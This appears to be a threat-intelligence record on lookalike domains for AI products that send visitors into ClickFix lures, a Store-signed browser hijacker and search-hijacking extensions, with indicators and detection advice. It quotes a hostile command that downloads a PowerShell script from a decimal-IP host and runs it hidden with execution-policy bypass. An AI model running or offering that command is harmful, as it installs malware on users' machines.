ai_role_detail: "Lookalike domains for AI products send visitors into ClickFix, a Store-signed browser hijacker, or a search-hijack extension. The AI products are the lure, not the operator."
technique_summary: "Island (Oleg Zaytsev, Nov 12, 2026) traced 186 lookalike domains across 27 AI brands, including Claude, ChatGPT, DeepSeek, Perplexity, Midjourney, ElevenLabs, and Cursor. A Nov 3, 2026 snapshot connected cloude.ai to a Windows ClickFix command and eight AI typos to an installer funnel. A Windows scan of cloude.ai went through xml.securetrackingnode.com/click to biomimicrydevtech.buzz (flow_id=81, bid about 0.0065 to 0.009) and then a random subdomain of blockchainfuturedev.buzz, which fingerprinted the browser and served a fake Cloudflare check. The recovered command was cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 saving %TEMP%\\W901.ps1 from 3112851459/985, then powershell -w h -nop -ep bypass -File that script. 3112851459 is 185.138.88.3 as a decimal integer. Pivoting the gate script hash found 550 scan records across 211 entry domains from April 2025 through November 2026, including lookalikes of banks, insurers, and enterprise software, plus Windows, macOS curl-to-zsh, and archive lures. Eight typos, including ckaude.ai, deepceek.com, copiot.com, elevenlebs.io, and vocie.ai, went through deezyj.com to fake Security Check pages that installed Net Guard, a Microsoft Store-signed Tauri app (publisher Myflixly App, product id 9MX3CH3BQ44Q, package family MyflixlyApp.NetGuard_k6q889pad57pt, analyzed 1.0.9.0). Island says the MSIX matches the Store hash and that buntai-sdk can change the default search engine, run JavaScript through DevTools Runtime.evaluate, and edit browser profiles. The same SDK is in Privacy Keeper 1.0.10.0 and MyFlixly Browser 1.0.10.0. The installer funnel spans 191 lander domains. preplexity.ai went to quickflashtool.com and a Chrome extension that sets the default search provider to find.flashysearches.com. It is one of 30 extensions from the same kit. Thirteen had been removed. The 17 still listed showed 972,000 declared users in total on November 3. Island says Socket's Oct 29, 2026 Searchjacked research lists 22 of the 30. An 81-domain portfolio including about 23 AI lookalikes ties to a11.click. Link anyrun-fake-ai-tools-2026-10."
initial_access: "A mistyped AI domain is handed to a traffic-distribution system that selects a ClickFix command, a Store installer, or an extension page"
ai_tooling_and_models:
  - "Lookalike domains for Claude, ChatGPT, DeepSeek, Perplexity, Cursor, and 22 other AI brands"
other_tooling:
  - "curl.exe and hidden PowerShell (LOLBAS)"
  - "Net Guard / buntai-sdk Microsoft Store package"
  - "Chrome search-override extensions"
victims_and_sectors: "People trying to reach AI tools. The wider gate also used lookalikes of banks, insurers, and enterprise software. No named victim organizations."
regions:
  - Multiple regions
attribution_or_cluster: "Unnamed. Island ties an 81-domain portfolio to a11.click and shared affiliate keys. No country is stated."
scale_and_metrics: "186 lookalike domains, 27 AI brands, in the Nov 3, 2026 snapshot. 211 entry domains on the ClickFix gate. 972,000 declared users across 17 still-listed search extensions on Nov 3. Net Guard funnel about 1,437 source domains."
prevention_angle: "Publish managed bookmarks for approved AI services. Alert when curl.exe writes a .ps1 and PowerShell starts with -w h and -ep bypass, including decimal hosts such as 3112851459. Do not treat a Microsoft Store signature as a reason to allow Net Guard package family MyflixlyApp.NetGuard_k6q889pad57pt. Enforce a managed search provider and block the extension IDs below."
related_magicsword_projects:
  - LOLBAS
source_notes: "Counts, the ClickFix command, decimal IP 3112851459, package identifiers, and the 972,000-user figure are from Island. The article's appendix lists more lookalikes than the IOC set below. Link anyrun-fake-ai-tools-2026-10. Historical payloads on chatlgpt.com, midj0urney.org, and deepsek.icu are included only as Island states them."
last_reviewed: 2026-11-15
region_notes: "Island does not name victim countries. The traffic system uses the visitor's country to pick a lure, which is not a target-region list."
